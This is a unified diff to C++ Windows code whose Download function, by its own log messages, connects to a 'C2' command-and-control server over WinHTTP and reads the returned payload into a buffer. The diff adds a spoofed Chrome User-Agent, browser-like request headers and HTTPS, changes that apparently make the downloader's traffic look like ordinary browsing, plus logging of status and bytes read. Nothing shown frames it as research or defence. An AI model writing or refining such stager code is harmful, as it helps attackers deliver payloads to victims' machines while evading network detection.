@@ -243,7 +243,7 @@ std::vector<BYTE> Download(int fake, LPCWSTR baseAddress, int port, LPCWSTR file
     WriteLog("Attempting to connect to C2: " + std::string(baseAddress, baseAddress + wcslen(baseAddress)));
     
     HINTERNET hSession = WinHttpOpen(
-        NULL,
+        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",  // Add User-Agent
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
@@ -268,6 +268,12 @@ std::vector<BYTE> Download(int fake, LPCWSTR baseAddress, int port, LPCWSTR file
 
     WriteLog("Successfully connected to C2 server");
 
+    // Add proper headers
+    LPCWSTR additionalHeaders = L"Accept: */*\r\n"
+                               L"Accept-Language: en-US,en;q=0.9\r\n"
+                               L"Connection: keep-alive\r\n"
+                               L"Cache-Control: no-cache\r\n";
+
     HINTERNET hRequest = WinHttpOpenRequest(
         hConnect,
         L"GET",
@@ -275,7 +281,7 @@ std::vector<BYTE> Download(int fake, LPCWSTR baseAddress, int port, LPCWSTR file
         NULL,
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
-        0);
+        WINHTTP_FLAG_SECURE);
 
     if (!hRequest) {
         WriteLog("Failed to create HTTP request");
@@ -286,8 +292,8 @@ std::vector<BYTE> Download(int fake, LPCWSTR baseAddress, int port, LPCWSTR file
 
     if (!WinHttpSendRequest(
         hRequest,
-        WINHTTP_NO_ADDITIONAL_HEADERS,
-        0,
+        additionalHeaders,
+        -1L,  // Length of additional headers
         WINHTTP_NO_REQUEST_DATA,
         0,
         0,
@@ -307,10 +313,37 @@ std::vector<BYTE> Download(int fake, LPCWSTR baseAddress, int port, LPCWSTR file
         return std::vector<BYTE>();
     }
 
+    // Get and log HTTP status code
+    DWORD statusCode = 0;
+    DWORD statusCodeSize = sizeof(statusCode);
+    if (WinHttpQueryHeaders(
+        hRequest,
+        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        NULL,
+        &statusCode,
+        &statusCodeSize,
+        NULL)) {
+        WriteLog("HTTP Status Code: " + std::to_string(statusCode));
+    }
+
+    // Get and log Content-Length
+    DWORD contentLength = 0;
+    DWORD contentLengthSize = sizeof(contentLength);
+    if (WinHttpQueryHeaders(
+        hRequest,
+        WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
+        NULL,
+        &contentLength,
+        &contentLengthSize,
+        NULL)) {
+        WriteLog("Content-Length: " + std::to_string(contentLength));
+    }
+
     WriteLog("Successfully received HTTP response");
 
     std::vector<BYTE> buffer;
     DWORD bytesRead = 0;
+    DWORD totalBytesRead = 0;
 
     do {
         BYTE temp[4096]{};
@@ -321,6 +354,8 @@ std::vector<BYTE> Download(int fake, LPCWSTR baseAddress, int port, LPCWSTR file
 
         if (bytesRead > 0) {
             buffer.insert(buffer.end(), temp, temp + bytesRead);
+            totalBytesRead += bytesRead;
+            WriteLog("Read " + std::to_string(bytesRead) + " bytes, total: " + std::to_string(totalBytesRead));
         }
 
     } while (bytesRead > 0);
